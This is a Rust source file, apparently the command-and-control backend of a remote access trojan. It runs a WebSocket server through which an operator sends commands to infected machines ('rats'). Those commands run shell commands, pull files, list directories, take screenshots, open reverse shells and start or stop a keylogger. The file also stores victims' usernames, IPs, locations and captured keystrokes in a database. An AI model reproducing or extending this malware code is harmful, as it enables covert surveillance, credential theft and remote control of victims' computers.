// src/backend.rs
use futures::{SinkExt, StreamExt};
use std::{collections::HashMap, sync::Arc};
use tokio::net::TcpListener;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio_tungstenite::accept_async;
use tungstenite::protocol::Message;

use crate::messages::rat;
use crate::{
  messages::{
    backend::{BackendMessageType, ResponseType},
    common::{MessageEnvelope, MessageType, MetadataWithId, ResponseStatus},
    file::{FileDownloadStatus, FileRequest},
    rat::C2RMessageType,
    keylogger::{KeylogData, KeylogDataEnvelope},
  },
  rat::Rat,
};

// Helper function to get a rat by ID
async fn get_rat<'a>(
  rat_pool: &'a Arc<Mutex<HashMap<i32, Rat>>>, rat_id: Option<i32>,
) -> Option<impl std::ops::DerefMut<Target = Rat> + 'a> {
  let rat_id = match rat_id {
    Some(id) => id,
    None => {
      eprintln!("Rat ID not provided");
      return None;
    }
  };

  let pool = rat_pool.lock().await;
  if pool.contains_key(&rat_id) {
    Some(tokio::sync::MutexGuard::map(pool, |p| p.get_mut(&rat_id).unwrap()))
  } else {
    None
  }
}

// Helper function to send a command to a rat and handle the response
async fn send_command_to_rat(rat: &Rat, message_to_rat: MessageType, rat_id: i32) -> ResponseStatus {
  println!("Sending request to Rat: {} | {:#?}", rat_id, message_to_rat);

  match rat.send_command(message_to_rat).await {
    Ok(response) => {
      println!("Command sent successfully");
      ResponseStatus::Success(response)
    }
    Err(e) => {
      eprintln!("Failed to send command: {}", e);
      ResponseStatus::Failure
    }
  }
}

async fn handle_backend_message(message: Message, rat_pool: &Arc<Mutex<HashMap<i32, Rat>>>) -> ResponseStatus {
  let deserialized: Result<MessageEnvelope, _> = serde_json::from_str(&message.to_string());
  match deserialized {
    Ok(message_envelope) => {
      println!("Received message: {:#?}", message_envelope);
      match message_envelope.message {
        MessageType::Backend(backend_message) => match backend_message {
          BackendMessageType::CliCommand(cli_command) => {
            println!("Received command: {:?}", cli_command);

            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let message_to_rat = MessageType::C2R(C2RMessageType::CliCommand(cli_command));
              return send_command_to_rat(&rat, message_to_rat, message_envelope.rat_id.unwrap()).await;
            }
            ResponseStatus::Failure
          }
          BackendMessageType::GetAllRats => {
            let mut rats = Vec::new();
            let conn = sqlite::Connection::open("rats.db").expect("Failed to open database");
            for row in conn
              .prepare("SELECT id, os, cpu, cpu_usage, memory, memory_usage, storage, used_storage, user, timestamp, ip, location, hostname FROM metadata")
              .unwrap()
              .into_iter()
              .map(|row| row.unwrap())
            {
              let rat_id = row.read::<&str, _>(0).parse::<i32>().unwrap();
              let rat = MetadataWithId {
                ratId:        rat_id,
                connected:    rat_pool.lock().await.contains_key(&rat_id),
                os:           row.read::<&str, _>(1).to_string(),
                cpu:          row.read::<&str, _>(2).parse().unwrap_or(0),
                cpu_usage:    row.read::<&str, _>(3).parse().unwrap_or(0.0),
                memory:       row.read::<&str, _>(4).parse().unwrap_or(0),
                memory_usage: row.read::<&str, _>(5).parse().unwrap_or(0.0),
                storage:      row.read::<&str, _>(6).parse().unwrap_or(0),
                used_storage: row.read::<&str, _>(7).parse().unwrap_or(0),
                user:         row.read::<&str, _>(8).to_string(),
                timestamp:    row.read::<&str, _>(9).parse().unwrap_or(0),
                ip:           row.read::<&str, _>(10).to_string(),
                location:     row.read::<&str, _>(11).to_string(),
                hostname:     row.read::<&str, _>(12).to_string(), // Read hostname from database
              };
              rats.push(rat_id);
            }
            ResponseStatus::Success(ResponseType::Rats(rats))
          }
          BackendMessageType::GetConnectedRats => {
            let mut rats = Vec::new();
            for (id, _) in rat_pool.lock().await.iter() {
              rats.push(*id);
            }
            ResponseStatus::Success(ResponseType::Rats(rats))
          }
          BackendMessageType::GetMetadata(rat_ids) => {
            let mut metadata: Vec<MetadataWithId> = vec![];
            println!("Getting metadata for rats: {:?}", rat_ids);

            // Get a list of actively connected rat IDs
            let connected_rats: HashMap<i32, bool> = {
              let pool = rat_pool.lock().await;
              rat_ids.iter().map(|&id| (id, pool.contains_key(&id))).collect()
            };

            // Create a connection to the database for disconnected rats
            let conn = sqlite::Connection::open("rats.db").expect("Failed to open database");

            for &id in &rat_ids {
              if connected_rats.get(&id) == Some(&true) {
                // Rat is actively connected
                if let Some(rat) = rat_pool.lock().await.get(&id) {
                  println!("Getting metadata for connected rat: {}", id);
                  let mut md = rat.get_metadata().await;
                  md.connected = true; // Mark as connected
                  metadata.push(md);
                }
              } else {
                // Rat is disconnected, retrieve from database
                println!("Getting metadata for disconnected rat: {}", id);
                let query = format!(
                        "SELECT os, cpu, cpu_usage, memory, memory_usage, storage, used_storage, user, timestamp, ip, location, hostname FROM metadata WHERE id = {}",
                        id
                    );

                for row in conn.prepare(query).unwrap().into_iter().map(|row| row.unwrap()) {
                  let md = MetadataWithId {
                    ratId:        id,
                    connected:    false, // Mark as disconnected
                    os:           row.read::<&str, _>(0).to_string(),
                    cpu:          row.read::<&str, _>(1).parse().unwrap_or(0),
                    cpu_usage:    row.read::<&str, _>(2).parse().unwrap_or(0.0),
                    memory:       row.read::<&str, _>(3).parse().unwrap_or(0),
                    memory_usage: row.read::<&str, _>(4).parse().unwrap_or(0.0),
                    storage:      row.read::<&str, _>(5).parse().unwrap_or(0),
                    used_storage: row.read::<&str, _>(6).parse().unwrap_or(0),
                    user:         row.read::<&str, _>(7).to_string(),
                    timestamp:    row.read::<&str, _>(8).parse().unwrap_or(0),
                    ip:           row.read::<&str, _>(9).to_string(),
                    location:     row.read::<&str, _>(10).to_string(),
                    hostname:     row.read::<&str, _>(11).to_string(),
                  };
                  metadata.push(md);
                }
              }
            }

            ResponseStatus::Success(ResponseType::RatsMetaData(metadata))
          }
          BackendMessageType::RequestFileDownload(file_request) => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let message_to_rat = MessageType::C2R(C2RMessageType::RequestFileDownload(file_request));
              let message_envelope_to_rat = MessageEnvelope {
                version: 1,
                rat_id:  message_envelope.rat_id,
                message: message_to_rat,
              };

              println!(
                "Sending file download request to Rat: {} | {:#?}",
                message_envelope.rat_id.unwrap(),
                message_envelope_to_rat
              );

              if let Err(e) = rat
                .writer
                .lock()
                .await
                .send(Message::Text(serde_json::to_string(&message_envelope_to_rat).unwrap()))
                .await
              {
                eprintln!("Failed to send file download request: {}", e);
                return ResponseStatus::Failure;
              }

              return ResponseStatus::InProgress;
            }
            ResponseStatus::Failure
          }
          BackendMessageType::GetDownloadStatus(download_id) => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let status = rat.get_download_status(download_id).await;
              return ResponseStatus::Success(ResponseType::DownloadStatus(FileDownloadStatus::Complete(status)));
            }
            ResponseStatus::Failure
          }
          BackendMessageType::GetDownloadedFiles => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let files = rat.get_downloaded_files().await;
              return ResponseStatus::Success(ResponseType::DownloadedFiles(files));
            }
            ResponseStatus::Failure
          }
          BackendMessageType::ListDir(list_dir) => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let message_to_rat = MessageType::C2R(C2RMessageType::ListDir(list_dir));
              return send_command_to_rat(&rat, message_to_rat, message_envelope.rat_id.unwrap()).await;
            }
            ResponseStatus::Failure
          }
          BackendMessageType::Screenshot => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let message_to_rat = MessageType::C2R(C2RMessageType::Screenshot);
              return send_command_to_rat(&rat, message_to_rat, message_envelope.rat_id.unwrap()).await;
            }
            ResponseStatus::Failure
          }
          BackendMessageType::ReverseShell(reverse_shell) => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let message_to_rat = MessageType::C2R(C2RMessageType::ReverseShell(reverse_shell));
              return send_command_to_rat(&rat, message_to_rat, message_envelope.rat_id.unwrap()).await;
            }
            ResponseStatus::Failure
          }
          BackendMessageType::StartKeylogger => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let message_to_rat = MessageType::C2R(C2RMessageType::StartKeylogger);
              return send_command_to_rat(&rat, message_to_rat, message_envelope.rat_id.unwrap()).await;
            }
            ResponseStatus::Failure
          }
          BackendMessageType::StopKeylogger => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let message_to_rat = MessageType::C2R(C2RMessageType::StopKeylogger);
              return send_command_to_rat(&rat, message_to_rat, message_envelope.rat_id.unwrap()).await;
            }
            ResponseStatus::Failure
          }
          BackendMessageType::GetKeyloggerData => {
              let conn = sqlite::Connection::open("rats.db").expect("Failed to open database");
              let rat_id = message_envelope.rat_id.unwrap_or(-1);
              let query = format!(
                  "SELECT keystrokes, statistics, timestamp FROM keylogs WHERE rat_id = {}",
                  rat_id
              );
              println!("Fetching keylogger data: {:?}", query);
          
              let mut result: Vec<KeylogData> = Vec::new();
          
              for row in conn.prepare(query).unwrap().into_iter().map(|row| row.unwrap()) {
                  let keystrokes_str = row.read::<&str, _>(0);
                  let statistics_str = row.read::<&str, _>(1);
                  
                  // Deserialize the JSON strings back into vectors and objects
                  if let Ok(keystrokes) = serde_json::from_str(keystrokes_str) {
                      if let Ok(statistics) = serde_json::from_str(statistics_str) {
                          result.push(KeylogData {
                              keystrokes,
                              statistics,
                          });
                      }
                  }
              }
              println!("Keylogger data: {:#?}", result.len());

              return ResponseStatus::Success(ResponseType::KeylogData(result));
          }
          BackendMessageType::GetKeyloggerStatus => {
            if let Some(rat) = get_rat(rat_pool, message_envelope.rat_id).await {
              let message_to_rat = MessageType::C2R(C2RMessageType::GetKeyloggerStatus);
              return send_command_to_rat(&rat, message_to_rat, message_envelope.rat_id.unwrap()).await;
            }
            ResponseStatus::Failure
          }
          _ => {
            eprintln!("Unsupported message type");
            ResponseStatus::Failure
          }
        },
        _ => {
          eprintln!("Unsupported Top Level message type");
          ResponseStatus::Failure
        }
      }
    }
    Err(e) => {
      eprintln!("Failed to deserialize message: {}", e);
      ResponseStatus::Failure
    }
  }
}

// ...existing code...

async fn handle_backend_connection(stream: TcpStream, rat_pool: Arc<Mutex<HashMap<i32, Rat>>>) {
  let ws_stream = accept_async(stream).await.expect("Failed to accept connection");
  println!("New WebSocket connection established");

  let (mut ws_sender, mut read) = ws_stream.split();

  while let Some(message) = read.next().await {
    match message {
      Ok(msg) => {
        println!("Received message: {}", msg.to_string());
        let response = handle_backend_message(msg, &rat_pool).await;
        let response_json = serde_json::to_string(&response).expect("Failed to serialize response");
        if let Err(e) = ws_sender.send(Message::Text(response_json)).await {
          eprintln!("Error sending message: {}", e);
          break;
        }
      }
      Err(e) => {
        eprintln!("Error reading from WebSocket: {}", e);
        break;
      }
    }
  }
  println!("Connection with backend closed");
}

pub async fn start_backend_server(addr_backend: &str, rat_pool: Arc<Mutex<HashMap<i32, Rat>>>) -> tokio::task::JoinHandle<()> {
  let listener_backend = TcpListener::bind(&addr_backend).await.expect("Can't bind to address");
  println!("Backend server listening on {}", addr_backend);

  tokio::spawn(async move {
    while let Ok((stream, _)) = listener_backend.accept().await {
      let rat_pool = Arc::clone(&rat_pool);
      
      // Use blocking tasks for SQLite operations since SQLite isn't thread-safe in async context
      tokio::task::spawn_blocking(move || {
        // Create a new runtime for this blocking task
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("Failed to build runtime");
            
        // Run the async connection handler in this separate runtime
        rt.block_on(handle_backend_connection(stream, rat_pool));
      });
    }
  })
}
